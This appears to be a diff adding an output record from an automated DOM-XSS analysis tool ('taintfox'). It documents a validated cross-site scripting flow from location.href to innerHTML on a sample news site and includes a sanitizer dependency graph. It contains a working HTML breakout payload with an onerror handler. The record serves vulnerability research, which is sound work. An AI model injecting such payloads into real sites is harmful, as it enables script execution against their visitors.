@@ -1,0 +1,104 @@
+// Finding: 650482dc-4078-4405-a8aa-8707bec43c6e
+// Finding.url: https://www.example351.com/news/details/2316169##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('b349e48a3aa743f293b6e2bcb66baa1b')><!--/*
+// Finding.parentloc: https://www.example351.com/news/details/2316169##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('b349e48a3aa743f293b6e2bcb66baa1b')><!--/*
+// Finding.domain: www.example351.com
+// Finding.base_domain: example351.com
+// Finding.source: location.href
+// Finding.sink: innerHTML
+// Sanitizer.score: 4
+// Sanitizer.name: 
+// Sanitizer.location: https://www.example351.com/news/details/2316169##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('b349e48a3aa743f293b6e2bcb66baa1b')><!--/* line 1 > eval - <anonymous>:2:15
+// Finding.begin: 15877
+// Finding.end: 15939
+// Finding.original_uuid: 5c47edc7-6f2b-4fd7-a588-0fb31d8ef339
+// Finding.TwentyFiveMillionFlowsId: -635249693
+// Finding.script: https://www.example351.com/news/details/2316169##"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog('b349e48a3aa743f293b6e2bcb66baa1b')><!--/* line 1 > eval
+// Finding.line: 2
+// Exploit.uuid: b349e48a-3aa7-43f2-93b6-e2bcb66baa1b
+// Exploit.success: true
+// Exploit.status: validated
+// Exploit.method: C
+// Exploit.type: html
+// Exploit.token: attribute
+// Exploit.content: href
+// Exploit.quote_type: "
+// Exploit.tag: a
+// Exploit.break_out: #"></iframe></style></script></object></embed></textarea><img src=x onerror=
+// Exploit.break_in: ><!--/*
+// Exploit.payload: #"></iframe></style></script></object></embed></textarea><img src=x onerror=taintfoxLog(1)><!--/*
+// Exploit.begin_taint_url: 0
+// Exploit.end_taint_url: 50
+// Exploit.replace_begin_url: 50
+// Exploit.replace_end_url: 50
+// Exploit.replace_begin_param: 116
+// Exploit.replace_end_param: 116
+// Issues.LargestEncodeAttrStringChain: 1
+// Issues.LargestTextFragmentEncodeChainLength: 0
+// Issues.HasApproximation: false
+// Issues.HasMissingImplementation: false
+// Issues.HasInfiniteRegexWithFunctionReplacer: false
+// Issues.MergedSplitAndJoins: false
+// Issues.HasUrlInRhsOfReplace: false
+// Issues.HasUrlInLhsOfReplace: false
+// Issues.HasCookieValueInLhsOfreplace: false
+// Issues.HasCookieValueInRhsOfreplace: false
+// Issues.HasCookieValueInMatchPattern: false
+// Issues.HasCookieValueInExecPattern: false
+// Issues.RemovedLRConcats: false
+// Issues.RemovedReplaceArtifacts: false
+// Issues.HasUrlInMatchPattern: false
+// Issues.HasUrlInExecPattern: false
+// Issues.RemovedNOPreplaces: false
+// Issues.Known_sanitizer: false
+// DepGraph.hash: 1759945539
+// DepGraph.sanitizer_hash: -1756184882
+// Large chain of EncodeAttrString Operations (1) 
+digraph cfg {
+n0 [shape=house, label="Input: x"];
+n1 [shape=ellipse, label="split"];
+n2 [shape=box, label="Lit: #"];
+n3 [shape=box, label="Var: x"];
+n4 [shape=ellipse, label="preg_replace"];
+n5 [shape=box, label="RegExp: /(^\s+|\s+$)/"];
+n6 [shape=box, label="Lit: "];
+n7 [shape=box, label="Var: x"];
+n8 [shape=ellipse, label="encodeURIComponent"];
+n9 [shape=box, label="Var: x"];
+n10 [shape=ellipse, label="."];
+n11 [shape=box, label="Lit: href="];
+n12 [shape=ellipse, label="."];
+n13 [shape=box, label="Lit: &"];
+n14 [shape=ellipse, label="."];
+n15 [shape=box, label="Lit: &"];
+n16 [shape=ellipse, label="."];
+n17 [shape=box, label="Lit: https://s7.addthis.com/static/sh.f48a1a04fe8dbf021b4cda1d.html#"];
+n18 [shape=ellipse, label="encodeAttrString"];
+n19 [shape=box, label="Var: x"];
+n20 [shape=ellipse, label="."];
+n21 [shape=box, label="Lit: <link href='https://cdn.speakol.com/video-js.css' rel='stylesheet'>"];
+n22 [shape=box, label="Var: x"];
+n23 [shape=doubleoctagon, label="Return: x"];
+n3 -> n0;
+n1 -> n2;
+n1 -> n3;
+n7 -> n1;
+n4 -> n5;
+n4 -> n6;
+n4 -> n7;
+n9 -> n4;
+n8 -> n9;
+n10 -> n11;
+n10 -> n8;
+n12 -> n13;
+n12 -> n10;
+n14 -> n12;
+n14 -> n15;
+n16 -> n17;
+n16 -> n14;
+n19 -> n16;
+n18 -> n19;
+n20 -> n18;
+n20 -> n21;
+n22 -> n20;
+n23 -> n22;
+}
